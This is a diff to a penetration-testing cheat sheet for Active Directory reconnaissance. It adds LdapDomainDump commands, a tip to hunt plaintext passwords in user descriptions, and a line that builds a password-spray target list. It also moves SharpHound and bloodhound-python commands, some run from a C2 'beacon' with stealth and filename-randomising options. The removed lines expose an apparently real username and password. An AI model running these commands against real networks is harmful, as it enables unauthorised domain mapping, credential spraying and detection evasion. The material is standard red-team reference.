@@ -1233,6 +1233,54 @@ beacon> ipconfig /all
 beacon> netstat -ano | findstr LIST
 ```
 
+### LdapDomainDump
+
+Generate grep-able, json, and html reports for users, computers, and groups info. *Tip* check user description field for plaintext passwords.
+
+```
+ldapdomaindump -u 'vault.local\pentest' -p 'Corp123!' prod-ad0
+```
+
+Generate a list of accounts that are not disabled:
+
+```
+awk -F '\t' '{print $3 " " $9}' domain_users.grep | grep -Ev 'sAMAccountName userAccountControl|ACCOUNT_DISABLED' | awk '{print $1}' | tee spray_users.txt
+```
+
+### BloodHound
+
+#### SharpHound
+
+*Note* "All" does **not** mean ALL
+
+```
+# thorough
+beacon> execute-assembly /opt/tools/SharpHound.exe -c All,GpoLocalGroup -d vault.local
+
+# stealth
+beacon> execute-assembly c:\tools\sharphound3.exe -c DcOnly --Stealth --RandomizeFilenames
+
+# download
+beacon> download .\20210210043130_BloodHound.zip
+```
+
+bloodhound-python
+
+```
+# from linux terminal
+$ bloodhound-python -c All -u j.smith -p Passw0rd -d vault.io -dc 10.0.0.1
+
+# via proxy
+proxychains bloodhound-python -u pentest -p 'Corp123!' -d vault.local -ns 10.8.40.5 -dc dc.vault.local --dns-tcp -c All,LoggedOn
+```
+
+See n00py's [notes](./read/noopy1-favorite-bloodhound-tips.md) for more coverage.
+
+### Resources
+- https://github.com/BloodHoundAD/SharpHound3
+- https://github.com/fox-it/BloodHound.py
+- https://github.com/hausec/Bloodhound-Custom-Queries
+
 #### BloodHound Queries
 
 ```
@@ -1436,37 +1484,6 @@ Get-ObjectACL -DistinguishedName "dc=companyx,dc=com" -ResolveGUIDs | ? { ($_.Ob
 - https://powersploit.readthedocs.io/en/latest/Recon/
 - https://github.com/tevora-threat/SharpView
 - https://github.com/HunnicCyber/SharpSniper
-
-## BloodHound
-
-SharpHound
-
-```
-# thorough
-beacon> execute-assembly /opt/tools/SharpHound.exe -c All,GpoLocalGroup -d vault.local
-
-# stealth
-beacon> execute-assembly c:\tools\sharphound3.exe -c DcOnly --Stealth --RandomizeFilenames
-
-# download
-beacon> download .\20210210043130_BloodHound.zip
-```
-
-bloodhound-python
-
-```
-# from linux terminal
-$ bloodhound-python -c All -u j.smith -p Passw0rd -d vault.io -dc 10.0.0.1
-
-# via proxy
-proxychains bloodhound-python -u robert.lanza -p 'U=zk1J.TYruU*' -d inception.local -ns 10.9.40.5 -dc indc.inception.local --dns-tcp -c All,LoggedOn
-```
-
-### Resources
-- https://github.com/BloodHoundAD/SharpHound3
-- https://github.com/fox-it/BloodHound.py
-- https://github.com/hausec/Bloodhound-Custom-Queries
-
 
 ### Host Recon
 
